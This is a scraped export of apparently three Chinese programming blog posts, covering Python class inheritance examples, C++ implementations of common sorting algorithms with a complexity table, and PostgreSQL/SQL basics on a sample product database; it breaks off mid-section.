27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 class Human: # 公共属性 height = 0 # 私有属性 __species = \u0026#39;H. sapiens\u0026#39; # 特殊方法: __init__, __del__, __repr__ 等 def __init__(self, name): # 参数赋值给实例的 name 字段 self.name = name # 初始化属性 self._age = 0 # 实例方法, 第一个参数总是self, 即实例对象 def say(self, msg): print(\u0026#34;{name}: {message}\u0026#34;.format(name = self.name, message = msg)) # 私有方法 def __sing(self): return \u0026#39;yo, yo, check it out...\u0026#39; # 类方法, 被所有此类实例共用 @classmethod def get_height(b): return b.height @classmethod def get_species(a): return a.__species # 静态方法, 没有实例或类的绑定 @staticmethod def grunt(): return \u0026#39;*grunt*\u0026#39; # 同名只读属性 @property def age(self): return self._age # 允许属性被修改 @age.setter def age(self, age): self._age = age # 允许属性被删除 @age.deleter def age(self): del self._age # 重载运算符方法: __add__, __sub__, __mul__, __mod__ 等 # 代码块指挥在模块为主程序时被执行 if __name__ == \u0026#39;__main__\u0026#39; # 定义实例 i = Human(name=\u0026#34;Ian\u0026#34;) i.say(\u0026#34;hi\u0026#34;) # =\u0026gt; \u0026#34;Ian: hi\u0026#34; # 调用类方法 i.say(i.get_species()) # =\u0026gt; \u0026#34;Ian: H. sapiens\u0026#34; i.say(i.get_height()) # =\u0026gt; \u0026#34;Ian: 0\u0026#34; # 修改类属性 Human.height = 170 # =\u0026gt; 公有属性可以外部修改 i.say(i.get_height()) # =\u0026gt; \u0026#34;Ian: 170\u0026#34; Human.__species = \u0026#39;cat\u0026#39; # =\u0026gt; 私有属性不会被外部修改 i.say(i.get_species()) # =\u0026gt; \u0026#34;Ian: H. sapiens\u0026#34; # 静态方法 print(Human.grunt()) # =\u0026gt; \u0026#34;*grunt*\u0026#34; print(i.grunt()) # =\u0026gt; \u0026#34;*grunt*\u0026#34; # 更新实例属性 i.age = 24 i.say(i.age) # =\u0026gt; \u0026#34;Ian: 24\u0026#34; del i.age # =\u0026gt; AttributeError, 抛出异常 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # 上述代码存在 human.py 中 from human import Human # 子类 (继承): 私有对象不能被继承(调用/重载) class Superhero(Human): # 重载父类公有属性 height = 2000 # 重载构造方法 def __init__(self, name, movie = False, superpowers = [\u0026#34;super strength\u0026#34;, \u0026#34;bulletproofing\u0026#34;]): self.fictional = True self.movie = movie self.superpowers = superpowers # 调用父类的构造方法 super().__init__(name) # 新增方法 def boast(self): for power in self.superpowers: print(\u0026#34;I wield the power of {pow}!\u0026#34;.format(pow=power)) if __name__ == \u0026#39;__main__\u0026#39;: sup = Superhero(name = \u0026#39;Tick\u0026#39;) if isinstance(sup, Human): # =\u0026gt; True print(\u0026#34;I am human\u0026#34;) if type(sup) is Superhero: # =\u0026gt; True print(\u0026#34;I am superhero\u0026#34;) # 获取方法解析顺序 print(Superhero.__mro__) # =\u0026gt; (\u0026lt;class \u0026#39;__main__.Superhero\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;human.Human\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) # 继承属性 sup.age = 30 print(sup.age) # =\u0026gt; 30 # 子类独有属性 print(\u0026#34;Am I Oscar eligible?\u0026#34; + str(sup.movie)) # 父类方法子类属性 print(sup.get_height) # =\u0026gt; 2000 # 子类独有方法 sup.boast() # =\u0026gt; I wield the power of super strength! # =\u0026gt; I wield the power of bulletproofing! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 # 上述代码存在 superhero.py 中 from superhero import Superhero # 定义另一个父类 class Bat: __species = \u0026#39;Baty\u0026#39; # 同样有 height 属性 heigt = 20 def __init__(self, can_fly = True): self.fly = can_fly # 同样有 say 方法 def say(self, msg): msg = \u0026#39;... ... ...\u0026#39; return msg def sonar(self): return \u0026#39;))) ... (((\u0026#39; # 多继承 class Batman(Superhero, Bat): def __init__(self, *args, **kwargs): Superhero.__init__(self, \u0026#39;anoymous\u0026#39;, movie = True, superpowers = [\u0026#39;Wealthy\u0026#39;], *args, **kwargs) Bat.__init__(self, *args, can_fly = False, **kwargs) self.name = \u0026#39;Sad Affleck\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: sup = Batman() print(Batman.__mro__) # =\u0026gt; (\u0026lt;class \u0026#39;__main__.Batman\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;superhero.Superhero\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;human.Human\u0026#39;\u0026gt;, # =\u0026gt; \u0026lt;class \u0026#39;bat.Bat\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) # 属性/方法重复时, 顺序继承 print(sup.get_height()) # =\u0026gt; 2000 sup.say(\u0026#39;I agree\u0026#39;) # =\u0026gt; \u0026#34;Sad Affleck: I agree\u0026#34; print(sup.sonar()) # =\u0026gt; \u0026#34;))) ... (((\u0026#34; sup.age = 100 print(sup.age) # =\u0026gt; 100 # 继承属性重载 print(\u0026#39;Can I fly? \u0026#39; + str(sup.fly)) # =\u0026gt; Can I fly? False ","date":"2023-10-14T00:00:00Z","permalink":"https://example.com/p/python%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"python快速入门"},{"content":"(CXX17 - G++13.1.0)\n稳定是指关键字相同的记录在排序后保持原有相对次序不变, 只有在原有相对次序有意义时需要考虑.\n排序算法 平均时间复杂度 最好时间复杂度 最坏时间复杂度 空间复杂度 稳定性 冒泡排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 快速排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(\\log(n))$ 不稳定 选择排序 $O(n^2)$ $O(n^2)$ $O(n^2)$ $O(1)$ 不稳定 堆排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(1)$ 不稳定 插入排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 希尔排序 $O(n\\log(n))$ $O(n^{1.3})$ $O(n^2)$ $O(1)$ 不稳定 归并排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(n)$ 稳定 计数排序 $O(n+k)$ $O(n+k)$ $O(n+k)$ $O(k)$ 稳定 桶排序 $O(n+k)$ $O(n+k)$ $O(n^2)$ $O(n+k)$ 稳定 基数排序 $O(nm)$ $O(nm)$ $O(nm)$ $O(n+m)$ 稳定 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;vector\u0026gt; using namespace std; // 数列最大值 template\u0026lt;typename Type\u0026gt; static Type maximal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type max = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026gt; max) max = arr[i]; } return max; } // 数列最小值 template\u0026lt;typename Type\u0026gt; static Type minimal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type min = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026lt; min) min = arr[i]; } return min; } 冒泡排序 每轮遍历时两两比较并交换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 template\u0026lt;typename Type\u0026gt; static void bubble(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { bool isSwapped = false; // 记录交换情况 for (int j = 0; j \u0026lt; arr.size() - 1 - i; ++j){ if (arr[j] \u0026gt; arr[j + 1]){ // 若条件改为\u0026#34;\u0026gt;=\u0026#34;则不再稳定 swap(arr[j], arr[j + 1]); isSwapped = true; } } if(!isSwapped) break; // 本轮没有交换说明已经有序 } } 快速排序 快速排序本质为比较交换排序. 分区中随机选择一个基准, 所有小于基准值的放在基准一侧, 大于基准值的放在另一侧, 退出时, 基准位于中间位置, 递归操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;random\u0026gt; template\u0026lt;typename Type\u0026gt; static void quickRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int left, int right){ if (left \u0026gt;= right) return; random_device seed; ranlux48 engine(seed()); uniform_int_distribution\u0026lt;\u0026gt; distrib(left,right); // 生成随机位置 int head = left, tail = right, flag = arr[distrib(engine)]; while (head \u0026lt; tail) { while (arr[head] \u0026lt; flag) ++head; // 左侧第一个小于基准的元素 while (arr[tail] \u0026gt; flag) --tail; // 右侧第一个大于基准的元素 if (head \u0026lt; tail) swap(arr[head], arr[tail]); // 小于基准的与大于基准的交换位置 else { // 本分区已经全部处理完 quickRecur(arr, left, tail); quickRecur(arr, tail+1, right); } } } 在重复值较多的场景下, 可以额外划分出一个区域将与基准值相等的元素聚集在基准值前后.\n选择排序 遍历过程中依次选出末尾序列中的最值元素放到序列起始位置.\n1 2 3 4 5 6 7 8 9 10 11 12 template\u0026lt;typename Type\u0026gt; static void selection(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { int min = i; for (int j = i + 1; j \u0026lt; arr.size(); ++j) { if (arr[j] \u0026lt; arr[min]) { min = j; } } // 选出末尾序列中最小值 swap(arr[i], arr[min]); // 交换到序列起始位置 } } 堆排序 堆排序本质为选择最值排序. 堆是一个完全二叉树, 大根堆指父节点值总大于(等于)子节点值, 小根堆指父节点值总小于(等于)子节点值. 以升序为例, 创建大根堆, 交换根(当前最大值)到叶末尾, 固定叶末尾, 其余部分变为大根堆(找出下一个最大值), 重复操作直至所有元素固定.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 template\u0026lt;typename Type\u0026gt; static void push(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { int dad = start, son = dad * 2 + 1; // 父节点和左子节点, 右子节点为\u0026#34;dad * 2 + 2\u0026#34; while (son \u0026lt;= end) { if ((son + 1 \u0026lt;= end) \u0026amp;\u0026amp; arr[son] \u0026lt; arr[son + 1]) ++son; // 选出子结点中较大的 if (arr[dad] \u0026gt; arr[son]) return; // 父节点大于子节点, 已为大根堆 else { swap(arr[dad], arr[son]); // 父节点小于等于子节点时, 互换 dad = son; son = dad * 2 + 1; // 再依次将子堆调整为大根堆 } } } template\u0026lt;typename Type\u0026gt; static void heap(vector\u0026lt;Type\u0026gt;\u0026amp; arr){ int size = arr.size(); for (int i = size / 2 - 1; i \u0026gt;= 0; --i) { push(arr, i, size-1); } // 构造大根堆 for (int i = size - 1; i \u0026gt; 0; --i) { swap(arr[0], arr[i]); // 交换当前末尾和根 push(arr, 0, i-1); // 固定好的末尾以外部分调整为大根堆 } } 插入排序 遍历时将当前元素插入到前面队列的相应位置, 该位置及其后的元素依次后移.\n1 2 3 4 5 6 7 8 9 10 11 static void insertion(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 1; i \u0026lt; arr.size(); ++i) { Type flag = arr[i]; // 记录当前元素 Type j = i - 1; while ((j \u0026gt;= 0) \u0026amp;\u0026amp; (flag \u0026lt; arr[j])){ arr[j + 1] = arr[j]; --j; } // 找到位置时, 元素依次后移 arr[j + 1] = flag; } } 希尔排序 分割为若干子序列进行插入排序, 子序列有序后, 再合并进行插入排序, 循环操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 template\u0026lt;typename Type\u0026gt; static void shell(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { int gap = 1; while (gap \u0026lt; arr.size() / 3){ gap = 3 * gap + 1; } // 子序列分割数 while (gap) { // 以gap为间隔的子序列分别进行插入排序 for (int i = gap; i \u0026lt; arr.size(); ++i) { for (int j = i; (j \u0026gt;= gap) \u0026amp;\u0026amp; (arr[j] \u0026lt; arr[j - gap]); j -= gap) { swap(arr[j], arr[j - gap]); } } gap /= 3; } } 归并排序 临时空间存储两个有序序列之和用来存放合并排序后的序列, 依次比较两个有序序列元素并存入临时空间, 重复上述操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 template\u0026lt;typename Type\u0026gt; static void mergeRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { if (start \u0026gt;= end) return; int mid = ((end - start) \u0026gt;\u0026gt; 1) + start; mergeRecur(arr, start, mid); // 左有序序列 mergeRecur(arr, mid + 1, end); // 右有序序列 static vector\u0026lt;Type\u0026gt; tmp; tmp.clear(); int left = start, right = mid + 1; // 两指针指向各自起始位置 while ((left \u0026lt;= mid) \u0026amp;\u0026amp; (right \u0026lt;= end)){ if (arr[left] \u0026lt;= arr[right]) tmp.push_back(arr[left++]); else tmp.push_back(arr[right++]); // 较小的元素存入临时数组, 较小元素序列指针右移 } while (left \u0026lt;= mid) tmp.push_back(arr[left++]); while (right \u0026lt;= end) tmp.push_back(arr[right++]); // 将剩余元素序列的元素依次存入临时数组 for (int i : tmp) arr[start++] = i; } 计数排序 非比较方式排序, 而是直接记录元素位置和个数并反向填充原数组, 只适用于整数排序.\n1 2 3 4 5 6 7 8 9 10 11 static void counting(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr), range = max - min + 1; static vector\u0026lt;int\u0026gt; cnt(range,0); // 用于记录的数组 for (int i : arr) ++cnt[i - min]; // 记录元素相对位置及个数 for (int i = 0, j = 0; i \u0026lt;= range - 1; ++i) { while (cnt[i]) { arr[j++] = i + min; // 反向填充原数组 --cnt[i]; } } } 桶排序 减少计数排序浪费的空间, 使用映射函数(类似于Hash函数), 映射后分布均匀时效率最高, 桶内部使用插入排序.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static void bucket(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr); int size = (max - min) / int(arr.size()) + 1, num = (max - min) / size + 1; // 确定桶容量和桶个数 vector\u0026lt;int\u0026gt; buckets[num]; for (int i = 0; i \u0026lt;= arr.size() - 1; ++i) { int idx = (arr[i] - min) / size; // 映射函数 buckets[idx].push_back(arr[i]); // 元素入桶 // 桶内使用插入排序 for (int j = int(buckets[idx].size()) - 1; j \u0026gt; 0; --j) { if (buckets[idx][j] \u0026lt; buckets[idx][j - 1]) swap(buckets[idx][j],buckets[idx][j - 1]); } } for (int i = 0, j = 0; i \u0026lt;= num - 1; ++i) { for (int k = 0; k \u0026lt;= int(buckets[i].size()) - 1; ++k) arr[j++] = buckets[i][k]; // 反向填充原数组 } } 基数排序 非比较方式排序, 将元素本身切分并逐部分比较, 除整数外, 还适用于特定格式的字符串和浮点数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 static void radix(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), digit = 0, shift = 1, size = int(arr.size()); while (max) { max /= 10; ++digit; } // 获取位数 vector\u0026lt;int\u0026gt; tmp(size, 0); // 从低位开始排序 for (int i = 0; i \u0026lt; digit; ++i) { vector\u0026lt;int\u0026gt; cnt(10,0); // 内部使用计数排序 for (int j = 0; j \u0026lt; size; ++j) { int k = (arr[j] / shift) % 10; ++cnt[k]; } for (int j = 1; j \u0026lt; 10; ++j) { cnt[j] = cnt[j - 1] + cnt[j]; } for (int j = size - 1; j \u0026gt;= 0; --j) { int k = (arr[j] / shift) % 10; tmp[cnt[k] - 1] = arr[j]; --cnt[k]; } for (int j = 0; j \u0026lt; size; ++j) { arr[j] = tmp[j]; } shift *= 10; } } 衍生问题 逆序对数量 在数组 $a[n]$ 中, 若 $0\\leq i\u0026lt;j\\leq n-1$ 且 $a[i] \u0026gt; a[j]$, 则有序对 $(a[i],a[j])$ 被称为逆序对, 现求数组中全部逆序对数量.\n在归并过程中累加: \u0026ldquo;cnt += mid - left + 1;\u0026rdquo; 第 $k$ 大的数 在不排列数组 $a[n]$ 情况下, 求数组中第 $1\\leq k\\leq n$ 大的数.\n快排过程中, 若基准右侧元素个数超过 $k$ 则所求一定在右侧, 忽略左侧递归; 时间复杂度为 $O(n)$. ","date":"2023-10-12T00:00:00Z","permalink":"https://example.com/p/%E6%8E%92%E5%BA%8F/","title":"排序"},{"content":"PostgreSQL 16.0\n1 2 3 4 5 6 7 \\PostgreSQL\\9.5\\data\\postgresql.conf listen_address = \u0026#39;localhost\u0026#39; \\PostgreSQL\\9.5\\bin\\psql.exe –U postgres \\PostgreSQL\\9.5\\bin\\psql.exe –U postgres -d mydb1 \\q 绪论 RDBMS(Relation Database Management System) 对象: DATABASE; TABLE. DDL(data definition language): CREATE; DROP; ALTER. DML(data Manipulation language): SELECT; INSERT; UPDATE; DELETE. DCL(data control language): COMMIT; ROLLBACK; GRANT; REVOKE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- 创建数据库 CREATE DATABASE 数据库名; -- 创建表 CREATE TABLE 表名 (列名 数据类型 数据约束, 列名 数据类型 数据约束, ... 表约束, 表约束, ...); -- 数据约束: NOT NULL, DEFUALT 值 -- 表约束: PRIMARY KEY (列名) -- 删除表 DROP TABLE 表名; -- 变更表名 ALTER TABLE 旧表名 RENAME TO 新表名 -- 添加表列 ALTER TABLE 表名 ADD COLUMN 列定义; -- 删除表列 ALTER TABLE 表名 DROP COLUMN 列名; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -- 插入新数据 INSERT INTO 表名 (列清单) VALUES (值清单); -- 复制数据 INSERT INTO 新表名 (列清单) SELECT 列清单 FROM 源表名 -- 删除数据 DELETE FROM 表名 WHERE 条件; -- 整行 -- 更改数据 UPDATE 表名 SET 列 = 运算式; ..., WHERE 条件; -- 事务(transaction) -- ACID: atomicity, consistency, isolaction, durability BEGIN TRANSACTION; DML语句; ... COMMIT; -- 提交 ROLLBACK; -- 回滚 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 -- e.g. CREATE DATABASE shop; CREATE TABLE Product (product_id CHAR(4) NOT NULL, product_name VARCHAR(100) NOT NULL, product_type VARCHAR(32) NOT NULL, sale_price INTEGER, purchase_price INTEGER, regist_date DATE, PRIMARY KEY (product_id)); BEGIN TRANSACTION; INSERT INTO Product VALUES (\u0026#39;0001\u0026#39;, \u0026#39;T恤衫\u0026#39;, \u0026#39;衣服\u0026#39;, 1000, 500, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0002\u0026#39;, \u0026#39;打孔器\u0026#39;, \u0026#39;办公用品\u0026#39;, 500, 320, \u0026#39;2009-09-11\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0003\u0026#39;, \u0026#39;运动T恤\u0026#39;, \u0026#39;衣服\u0026#39;, 4000, 2800, NULL); INSERT INTO Product VALUES (\u0026#39;0004\u0026#39;, \u0026#39;菜刀\u0026#39;, \u0026#39;厨房用具\u0026#39;, 3000, 2800, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0005\u0026#39;, \u0026#39;高压锅\u0026#39;, \u0026#39;厨房用具\u0026#39;, 6800, 5000, \u0026#39;2009-01-15\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0006\u0026#39;, \u0026#39;叉子\u0026#39;, \u0026#39;厨房用具\u0026#39;, 500, NULL, \u0026#39;2009-09-20\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0007\u0026#39;, \u0026#39;擦菜板\u0026#39;, \u0026#39;厨房用具\u0026#39;, 880, 790, \u0026#39;2008-04-28\u0026#39;); INSERT INTO Product VALUES (\u0026#39;0008\u0026#39;, \u0026#39;圆珠笔\u0026#39;, \u0026#39;办公用品\u0026#39;, 100, NULL,\u0026#39;2009-11-11\u0026#39;); COMMIT; 基础查询方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 -- 列查询 SELECT 运算式, 运算式, ... FROM 表名; -- 全部列 SELECT * FROM 表名; -- 去除重复行 SELECT DISTINCT 运算式, ... FROM 表名; -- 列别名 SELECT 运算式 AS \u0026#34;中文列名\u0026#34;, 运算式 AS 英文列名, ... FROM 表名; -- NULL运算均会得到NULL -- 常数 SELECT 常数 AS 列名, ... FROM 表名; -- 行条件 SELECT 运算式, ... FROM 表名 WHERE 条件; /* 比较运算符 = 相等 \u0026lt;\u0026gt; 不相等 IS NULL 值为NULL IS NOT NULL 值不为NULL */ /* 逻辑运算符 NOT 非 AND 和 OR 或 */ /* 逻辑值 TRUE FALSE UNKNOWN 判断NULL时 */ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 -- 聚合函数: COUNT, SUM, AVG, MAX, MIN -- 分组 SELECT 表达式, ... FROM 表名 GROUP BY 列名(聚合键), ... HAVING 条件; -- 排序 SELECT 表达式, ... FROM 表名 ORDER BY 列名(排序键) ASC, ... -- 缺省/ASC为升序, DESC为降序 /* 书写顺序: SELECT-\u0026gt;FROM-\u0026gt;WHERE-\u0026gt;GROUP BY-\u0026gt;HAVING-\u0026gt;ORDER BY 执行顺序: FROM-\u0026gt;WHERE-\u0026gt;GROUP BY-\u0026gt;HAVING-\u0026gt;SELECT-\u0026gt;ORDER BY WHERE为行指定条件, HAVING为聚合结果指定条件 使用聚合时SELECT只能包含常数, 聚合函数, 聚合键 GROUP BY不能有别名, 结果无序 WHERE中不能使用聚合函数, GROUP BY和HAVING可以 */ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 -- e.g. SELECT purchase_price, COUNT(*) FROM Product WHERE product_type = \u0026#39;衣服\u0026#39; GROUP BY purchase_price; SELECT product_type, AVG(sale_price) FROM Product GROUP BY product_type HAVING AVG(sale_price) \u0026gt;= 2500; SELECT product_id, product_name, sale_price, purchase_price FROM Product ORDER BY sale_price DESC, product_id; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* 视图: 存储SELECT语句的表 避免视图嵌套, 定义视图不能使用ORDER BY, 视图和表需要同时更新 */ -- 创建视图 CREATE VIEW 视图名 (视图列名, ...) AS SELECT语句; -- 删除视图 DROP VIEW 视图名; -- 子查询: 临时视图 (SELECT 运算式 AS 视图列名, ... WHERE 条件 FROM 表名 GROUP BY 列名(聚合键), ... HAVING 条件) AS 视图名 /* 标量子查询: 只返回值, 可用于表达式 SELECT需要包含常数, 聚合键, 聚合函数以外的运算式时 WHERE需要使用聚合函数时 HAVING使用聚合函数需要作用范围不同时 */ -- 关联子查询: 细分组内比较 (SELECT 运算式 AS 视图列名, ... FROM 表名 AS 别名 WHERE 别名.列名 = 别名.列名) -- 结合条件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -- e.g. CREATE VIEW ProductSum (product_type, cnt_product) AS SELECT product_type, COUNT(*) FROM Product GROUP BY product_type; SELECT product_type, cnt_product FROM ProductSum; SELECT product_type, cnt_product FROM (SELECT product_type, COUNT(*) AS cnt_product FROM Product GROUP BY product_type ) AS ProductSum; SELECT product_type, AVG(sale_price) FROM Product GROUP BY product_type HAVING AVG(sale_price) \u0026gt; (SELECT AVG(sale_price) FROM Product); SELECT product_type, product_name, sale_price FROM Product AS P1 WHERE sale_price \u0026gt; (SELECT AVG(sale_price) FROM Product AS P2 WHERE P1.product_type = P2.product_type GROUP BY product_type); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /* 函数: 输入参数, 输出返回值 数值: ABS, MOD, ROUND 字符串: LENGTH, CONCAT, LOWER, UPPER, REPLACE, SUBSTRING(... FROM ... FOR ...) 日期: CURRENT_DATE, CURRENT_TIME, CURRENT_TIMESTAMP, EXTRACT(... FROM ...) 转换: CAST(... AS ...), COALESCE(NULL, ... )返回第一个不为NULL值 */ /* 谓词: 返回逻辑值的函数 模式匹配: LIKE, 前方一致 \u0026#39;...%\u0026#39;, 中间一致 \u0026#39;%...%\u0026#39;, 后方一致 \u0026#39;%...\u0026#39; 范围: BETWEEN ... AND ... 指定/排除多个: IN (..., ...), NOT IN(..., ...), 输入参数可为表 判断记录存在: EXISTS, NOT EXISTS */ -- 条件分支 CASE WHEN 条件 THEN 表达式 ... ELSE 表达式 END 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 -- e.g. CREATE TABLE ShopProduct (shop_id CHAR(4) NOT NULL, shop_name VARCHAR(200) NOT NULL, product_id CHAR(4) NOT NULL, quantity INTEGER NOT NULL, PRIMARY KEY (shop_id, product_id)); BEGIN TRANSACTION; INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0001\u0026#39;, 30); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0002\u0026#39;, 50); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000A\u0026#39;, \u0026#39;东京\u0026#39;, \u0026#39;0003\u0026#39;, 15); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0002\u0026#39;, 30); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0003\u0026#39;, 120); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0004\u0026#39;, 20); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0006\u0026#39;, 10); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000B\u0026#39;, \u0026#39;名古屋\u0026#39;, \u0026#39;0007\u0026#39;, 40); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0003\u0026#39;, 20); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0004\u0026#39;, 50); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0006\u0026#39;, 90); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000C\u0026#39;, \u0026#39;大阪\u0026#39;, \u0026#39;0007\u0026#39;, 70); INSERT INTO ShopProduct (shop_id, shop_name, product_id, quantity) VALUES (\u0026#39;000D\u0026#39;, \u0026#39;福冈\u0026#39;, \u0026#39;0001\u0026#39;, 100); COMMIT; SELECT product_name, sale_price FROM Product WHERE product_id NOT IN (SELECT product_id FROM ShopProduct WHERE shop_id = \u0026#39;000A\u0026#39;); SELECT product_name, sale_price FROM Product AS P WHERE NOT EXISTS (SELECT * FROM ShopProduct AS SP WHERE SP.shop_id = \u0026#39;000A\u0026#39; AND SP.product_id = P.product_id); SELECT SUM(CASE WHEN product_type = \u0026#39;衣服\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_clothes, SUM(CASE WHEN product_type = \u0026#39;厨房用具\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_kitchen, SUM(CASE WHEN product_type = \u0026#39;办公用品\u0026#39; THEN sale_price ELSE 0 END) AS sum_price_office FROM Product; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 行运算: UNION, INTERSECT, EXCEPT 运算式数量及类型一致, ORDER BY只能加在最后 保留重复行: 行运算+ALL */ SELECT 运算式 FROM 表名 行运算 SELECT 运算式 FROM 表名; /* 列运算 内联结: JOIN 同时存在 外联结: RIGHT/LEFT OUTER JOIN 决定主表 交叉联结: CROSS JOIN 直积 */ SELECT 别名.运算式, ... FROM 表名 AS 别名 INNER JOIN ... ON 条件(联结键) 1 2 3 4 5 6 7 8 9 10 11 -- e.g. SELECT product_id, product_name FROM Product2 EXCEPT SELECT product_id, product_name FROM Product ORDER BY product_id; SELECT SP.shop_id, SP.shop_name, SP.product_id, P.product_name, P.sale_price FROM ShopProduct AS SP RIGHT OUTER JOIN Product AS P ON SP.product_id = P.product_id; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 窗口函数 OLAP(OnLine Analytical Processing) 排序: RANK()相同位次跳过, DENSE_RANK相同位次不跳过, ROW_NUMBER唯一连续位次 聚合: SUM累计, AVG移动平均 ROWS BETWEEN ... PRECEDING AND ... FOLLOWING框架 */ -- 多级聚合 GROUP BY 列名, ... WITH ROLLUP -- 相当于如下 GROUP BY ( ), GROUP BY (列名1), GROUP BY(列名1, 列名2), ... -- 区分聚合与原值 GROUPING (列名) -- 超级分组返回1, 原值NULL返回0 GROUPING(列名1, 列名2, 列名3) -- 相当于如下 GROUPING(列名3) + (GROUPING(列名2) \u0026lt;\u0026lt; 1) + (GROUPING(列名3) \u0026lt;\u0026lt; 2) -- 积木 (多维) GROUP BY 列名, ... WITH 